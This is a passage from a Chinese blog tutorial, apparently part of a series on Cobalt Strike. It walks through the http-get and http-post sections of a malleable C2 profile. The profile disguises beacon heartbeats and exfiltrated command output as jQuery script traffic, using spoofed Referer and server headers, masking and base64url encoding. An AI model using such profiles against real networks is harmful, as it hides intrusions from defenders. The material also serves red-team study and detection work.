+</span></span><span class="line"><span class="cl">            <span class="err">#</span> <span class="mi">1</span><span class="err">st</span> <span class="err">Line</span>
+</span></span><span class="line"><span class="cl">            <span class="err">prepend</span> <span class="s2">&#34;/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license */&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">            <span class="err">append</span> <span class="s2">&#34;\&#34;.(o=t.documentElement...省略...t||(e.jQuery=e.$=w),w});&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">            <span class="err">print;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>修改HTTP Get类型的请求/响应，用于检查teamserver的任务，也就是心跳包。</p>
+<h3 id="http-post">HTTP POST</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">################################################</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span> <span class="err">HTTP</span> <span class="err">POST</span>
+</span></span><span class="line"><span class="cl"><span class="err">################################################</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span> <span class="err">Description:</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">POST</span> <span class="err">is</span> <span class="err">used</span> <span class="err">to</span> <span class="err">send</span> <span class="err">output</span> <span class="err">to</span> <span class="err">the</span> <span class="err">teamserver</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">Can</span> <span class="err">use</span> <span class="err">HTTP</span> <span class="err">GET</span> <span class="err">or</span> <span class="err">POST</span> <span class="err">to</span> <span class="err">send</span> <span class="err">data</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">Note</span> <span class="err">on</span> <span class="err">using</span> <span class="err">GET:</span> <span class="err">Beacon</span> <span class="err">will</span> <span class="err">automatically</span> <span class="err">chunk</span> <span class="err">its</span> <span class="err">responses</span> <span class="err">(and</span> <span class="err">use</span> <span class="err">multiple</span> <span class="err">requests)</span> <span class="err">to</span> <span class="err">fit</span> <span class="err">the</span> <span class="err">constraints</span> <span class="err">of</span> <span class="err">an</span> <span class="err">HTTP</span> <span class="err">GET-only</span> <span class="err">channel.</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span> <span class="err">Defaults:</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">uri</span> <span class="s2">&#34;/activity&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">Headers</span> <span class="err">(Sample)</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>      <span class="err">Accept:</span> <span class="err">*/*</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>      <span class="err">Cookie:</span> <span class="err">CN</span><span class="mi">7</span><span class="err">uVizbjdUdzNShKoHQc</span><span class="mi">1</span><span class="err">HdhBsB</span><span class="mi">0</span><span class="err">XMCbWJGIRF</span><span class="mi">27</span><span class="err">eYLDqc</span><span class="mi">9</span><span class="err">Tnb</span><span class="mi">220</span><span class="err">an</span><span class="mi">8</span><span class="err">ZgFcFMXLARTWEGgsvWsAYe+bsf</span><span class="mi">67</span><span class="err">HyISXgvTUpVJRSZeRYkhOTgr</span><span class="mi">31</span><span class="err">/</span><span class="mi">5</span><span class="err">xHiittfuu</span><span class="mi">1</span><span class="err">QwcKdXopIE+yP</span><span class="mi">8</span><span class="err">QmpyRq</span><span class="mi">3</span><span class="err">DgsRB</span><span class="mi">45</span><span class="err">PFEGcidrQn</span><span class="mi">3</span><span class="err">/aK</span><span class="mi">0</span><span class="err">MnXoM=</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>      <span class="err">User-Agent</span> <span class="err">Mozilla/</span><span class="mf">4.0</span> <span class="err">(compatible;</span> <span class="err">MSIE</span> <span class="mf">8.0</span><span class="err">;</span> <span class="err">Windows</span> <span class="err">NT</span> <span class="mf">5.1</span><span class="err">;</span> <span class="err">Trident/</span><span class="mf">4.0</span><span class="err">;</span> <span class="err">SV</span><span class="mi">1</span><span class="err">)</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span> <span class="err">Guidelines:</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">-</span> <span class="err">Decide</span> <span class="err">if</span> <span class="err">you</span> <span class="err">want</span> <span class="err">to</span> <span class="err">use</span> <span class="err">HTTP</span> <span class="err">GET</span> <span class="err">or</span> <span class="err">HTTP</span> <span class="err">POST</span> <span class="err">requests</span> <span class="err">for</span> <span class="err">this</span> <span class="err">section</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">-</span> <span class="err">Add</span> <span class="err">customize</span> <span class="err">HTTP</span> <span class="err">headers</span> <span class="err">to</span> <span class="err">the</span> <span class="err">HTTP</span> <span class="err">traffic</span> <span class="err">of</span> <span class="err">your</span> <span class="err">campaign</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">-</span> <span class="err">Analyze</span> <span class="err">sample</span> <span class="err">HTTP</span> <span class="err">traffic</span> <span class="err">to</span> <span class="err">use</span> <span class="err">as</span> <span class="err">a</span> <span class="err">reference</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span> <span class="err">Use</span> <span class="err">HTTP</span> <span class="err">POST</span> <span class="err">for</span> <span class="err">http-post</span> <span class="err">section</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span> <span class="err">Uncomment</span> <span class="err">this</span> <span class="err">Section</span> <span class="err">to</span> <span class="err">activate</span>
+</span></span><span class="line"><span class="cl"><span class="err">http-post</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="err">set</span> <span class="err">uri</span> <span class="nt">&#34;/jquery-3.3.2.min.js&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">    <span class="err">set</span> <span class="err">verb</span> <span class="s2">&#34;POST&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="err">client</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="err">header</span> <span class="nt">&#34;Accept&#34;</span> <span class="s2">&#34;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">        <span class="err">#header</span> <span class="s2">&#34;Host&#34;</span> <span class="s2">&#34;code.jquery.com&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">        <span class="err">header</span> <span class="s2">&#34;Referer&#34;</span> <span class="s2">&#34;http://code.jquery.com/&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">        <span class="err">header</span> <span class="s2">&#34;Accept-Encoding&#34;</span> <span class="s2">&#34;gzip, deflate&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">       	
+</span></span><span class="line"><span class="cl">				<span class="err">#</span> <span class="err">id标签是将beacon</span> <span class="err">ID先后进行mask、base</span><span class="mi">64</span><span class="err">url编码后拼接在自定义的__cfduid参数后。</span>
+</span></span><span class="line"><span class="cl">        <span class="err">id</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="err">mask;</span>       
+</span></span><span class="line"><span class="cl">            <span class="err">base64url;</span>
+</span></span><span class="line"><span class="cl">            <span class="err">parameter</span> <span class="nt">&#34;__cfduid&#34;</span><span class="err">;</span>            
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">				<span class="err">#</span> <span class="err">output标签是beacon执行完后把数据mask、base</span><span class="mi">64</span><span class="err">url编码后回传给teamserver</span>
+</span></span><span class="line"><span class="cl">        <span class="err">output</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="err">mask;</span>
+</span></span><span class="line"><span class="cl">            <span class="err">base64url;</span>
+</span></span><span class="line"><span class="cl">            <span class="err">print;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="err">server</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="err">header</span> <span class="nt">&#34;Server&#34;</span> <span class="s2">&#34;NetDNA-cache/2.2&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">        <span class="err">header</span> <span class="s2">&#34;Cache-Control&#34;</span> <span class="s2">&#34;max-age=0, no-cache&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">        <span class="err">header</span> <span class="s2">&#34;Pragma&#34;</span> <span class="s2">&#34;no-cache&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">        <span class="err">header</span> <span class="s2">&#34;Connection&#34;</span> <span class="s2">&#34;keep-alive&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">        <span class="err">header</span> <span class="s2">&#34;Content-Type&#34;</span> <span class="s2">&#34;application/javascript; charset=utf-8&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="err">output</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="err">mask;</span>
+</span></span><span class="line"><span class="cl">            <span class="err">base64url;</span>
+</span></span><span class="line"><span class="cl">            <span class="err">##</span> <span class="err">The</span> <span class="err">javascript</span> <span class="err">was</span> <span class="err">changed.</span>  <span class="err">Double</span> <span class="err">quotes</span> <span class="err">and</span> <span class="err">backslashes</span> <span class="err">were</span> <span class="err">escaped</span> <span class="err">to</span> <span class="err">properly</span> <span class="err">render</span> <span class="err">(Refer</span> <span class="err">to</span> <span class="err">Tips</span> <span class="err">for</span> <span class="err">Profile</span> <span class="err">Parameter</span> <span class="err">Values)</span>
+</span></span><span class="line"><span class="cl">            <span class="err">#</span> <span class="err">2nd</span> <span class="err">Line</span>            
+</span></span><span class="line"><span class="cl">            <span class="err">prepend</span> <span class="nt">&#34;!function(e,t)...省略...P=\&#34;\r&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">            <span class="err">#</span> <span class="mi">1</span><span class="err">st</span> <span class="err">Line</span>
+</span></span><span class="line"><span class="cl">            <span class="err">prepend</span> <span class="s2">&#34;/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license */&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">            <span class="err">append</span> <span class="s2">&#34;\&#34;.(o=t.documentElement...省略...t||(e.jQuery=e.$=w),w});&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">            <span class="err">print;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>http-post部分用作beacon对teamserver发出的命令的响应，也就是控制命令执行结果传输的具体细节。</p>
+<h3 id="生成方式">生成方式</h3>
+<p>除了上面的https://github.com/threatexpress/malleable-c2的例子，我们也可以使用https://github.com/threatexpress/random_c2_profile项目生成随机的profile，根据自己需要进行定制即可。</p>
+<h3 id="说明">说明</h3>
+<p>profile的修改主要可以分为流量侧和主机侧流量侧主要涉及http-get和http-post两个标签，主机侧主要涉及stage、process-inject、post-ex这三个标签。在实战时，根据具体情况进行对应修改即可。</p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2024-01-18</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="https://www.v4ler1an.com/2024/01/cobalt_strike_basic_no.3/" data-title="Cobalt Strike Basic No.3 -- Malleable C2 Profile" data-via="@YaoyaoShaw" data-hashtags="C2"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="https://www.v4ler1an.com/2024/01/cobalt_strike_basic_no.3/" data-hashtag="C2"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Hacker News" data-sharer="hackernews" data-url="https://www.v4ler1an.com/2024/01/cobalt_strike_basic_no.3/" data-title="Cobalt Strike Basic No.3 -- Malleable C2 Profile"><i class="fab fa-hacker-news fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="https://www.v4ler1an.com/2024/01/cobalt_strike_basic_no.3/" data-title="Cobalt Strike Basic No.3 -- Malleable C2 Profile"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@2.14.0/icons/line.svg"></i></a><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://www.v4ler1an.com/2024/01/cobalt_strike_basic_no.3/" data-title="Cobalt Strike Basic No.3 -- Malleable C2 Profile"><i class="fab fa-weibo fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/c2/">C2</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2024/01/cobalt_strike_basic_no.2/" class="prev" rel="prev" title="Cobalt Strike Basic No.2 -- Attack and Post Exploitation"><i class="fas fa-angle-left fa-fw"></i>Cobalt Strike Basic No.2 -- Attack and Post Exploitation</a>
+            <a href="/2024/02/c2%E9%9A%90%E8%97%8F%E9%9A%8F%E7%AC%94/" class="next" rel="next" title="CS隐藏随笔">CS隐藏随笔<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="disqus_thread" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://disqus.com/?ref_noscript">Disqus</a>.
+            </noscript><div id="valine" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Something just like this.</div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2021 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://www.v4ler1an.com" target="_blank"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/valine/valine.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.2.0/dist/css/lightgallery.min.css"><script type="text/javascript" src="https://.disqus.com/embed.js" defer></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.37.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.2.0/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.2.0/dist/js/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lg-thumbnail.js@1.2.0/dist/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lg-zoom.js@1.2.0/dist/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.4.0/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{"valine":{"appId":"OGG2bwJUUrIOs4sAfU87yE6d-gzGzoHsz","appKey":"vOzsADf7YdkMoNXlgShAFepl","avatar":"mp","el":"#valine","emojiCDN":"https://cdn.jsdelivr.net/npm/emoji-datasource-google@5.0.1/img/google/64/","emojiMaps":{"100":"1f4af.png","alien":"1f47d.png","anger":"1f4a2.png","angry":"1f620.png","anguished":"1f627.png","astonished":"1f632.png","black_heart":"1f5a4.png","blue_heart":"1f499.png","blush":"1f60a.png","bomb":"1f4a3.png","boom":"1f4a5.png","broken_heart":"1f494.png","brown_heart":"1f90e.png","clown_face":"1f921.png","cold_face":"1f976.png","cold_sweat":"1f630.png","confounded":"1f616.png","confused":"1f615.png","cry":"1f622.png","crying_cat_face":"1f63f.png","cupid":"1f498.png","dash":"1f4a8.png","disappointed":"1f61e.png","disappointed_relieved":"1f625.png","dizzy":"1f4ab.png","dizzy_face":"1f635.png","drooling_face":"1f924.png","exploding_head":"1f92f.png","expressionless":"1f611.png","face_vomiting":"1f92e.png","face_with_cowboy_hat":"1f920.png","face_with_hand_over_mouth":"1f92d.png","face_with_head_bandage":"1f915.png","face_with_monocle":"1f9d0.png","face_with_raised_eyebrow":"1f928.png","face_with_rolling_eyes":"1f644.png","face_with_symbols_on_mouth":"1f92c.png","face_with_thermometer":"1f912.png","fearful":"1f628.png","flushed":"1f633.png","frowning":"1f626.png","ghost":"1f47b.png","gift_heart":"1f49d.png","green_heart":"1f49a.png","grimacing":"1f62c.png","grin":"1f601.png","grinning":"1f600.png","hankey":"1f4a9.png","hear_no_evil":"1f649.png","heart":"2764-fe0f.png","heart_decoration":"1f49f.png","heart_eyes":"1f60d.png","heart_eyes_cat":"1f63b.png","heartbeat":"1f493.png","heartpulse":"1f497.png","heavy_heart_exclamation_mark_ornament":"2763-fe0f.png","hole":"1f573-fe0f.png","hot_face":"1f975.png","hugging_face":"1f917.png","hushed":"1f62f.png","imp":"1f47f.png","innocent":"1f607.png","japanese_goblin":"1f47a.png","japanese_ogre":"1f479.png","joy":"1f602.png","joy_cat":"1f639.png","kiss":"1f48b.png","kissing":"1f617.png","kissing_cat":"1f63d.png","kissing_closed_eyes":"1f61a.png","kissing_heart":"1f618.png","kissing_smiling_eyes":"1f619.png","laughing":"1f606.png","left_speech_bubble":"1f5e8-fe0f.png","love_letter":"1f48c.png","lying_face":"1f925.png","mask":"1f637.png","money_mouth_face":"1f911.png","nauseated_face":"1f922.png","nerd_face":"1f913.png","neutral_face":"1f610.png","no_mouth":"1f636.png","open_mouth":"1f62e.png","orange_heart":"1f9e1.png","partying_face":"1f973.png","pensive":"1f614.png","persevere":"1f623.png","pleading_face":"1f97a.png","pouting_cat":"1f63e.png","purple_heart":"1f49c.png","rage":"1f621.png","relaxed":"263a-fe0f.png","relieved":"1f60c.png","revolving_hearts":"1f49e.png","right_anger_bubble":"1f5ef-fe0f.png","robot_face":"1f916.png","rolling_on_the_floor_laughing":"1f923.png","scream":"1f631.png","scream_cat":"1f640.png","see_no_evil":"1f648.png","shushing_face":"1f92b.png","skull":"1f480.png","skull_and_crossbones":"2620-fe0f.png","sleeping":"1f634.png","sleepy":"1f62a.png","slightly_frowning_face":"1f641.png","slightly_smiling_face":"1f642.png","smile":"1f604.png","smile_cat":"1f638.png","smiley":"1f603.png","smiley_cat":"1f63a.png","smiling_face_with_3_hearts":"1f970.png","smiling_imp":"1f608.png","smirk":"1f60f.png","smirk_cat":"1f63c.png","sneezing_face":"1f927.png","sob":"1f62d.png","space_invader":"1f47e.png","sparkling_heart":"1f496.png","speak_no_evil":"1f64a.png","speech_balloon":"1f4ac.png","star-struck":"1f929.png","stuck_out_tongue":"1f61b.png","stuck_out_tongue_closed_eyes":"1f61d.png","stuck_out_tongue_winking_eye":"1f61c.png","sunglasses":"1f60e.png","sweat":"1f613.png","sweat_drops":"1f4a6.png","sweat_smile":"1f605.png","thinking_face":"1f914.png","thought_balloon":"1f4ad.png","tired_face":"1f62b.png","triumph":"1f624.png","two_hearts":"1f495.png","unamused":"1f612.png","upside_down_face":"1f643.png","weary":"1f629.png","white_frowning_face":"2639-fe0f.png","white_heart":"1f90d.png","wink":"1f609.png","woozy_face":"1f974.png","worried":"1f61f.png","yawning_face":"1f971.png","yellow_heart":"1f49b.png","yum":"1f60b.png","zany_face":"1f92a.png","zipper_mouth_face":"1f910.png","zzz":"1f4a4.png"},"enableQQ":false,"highlight":true,"lang":"zh-cn","pageSize":10,"placeholder":"人世纷乱，出入平安。","recordIP":true,"visitor":true}},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.zh-cn","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
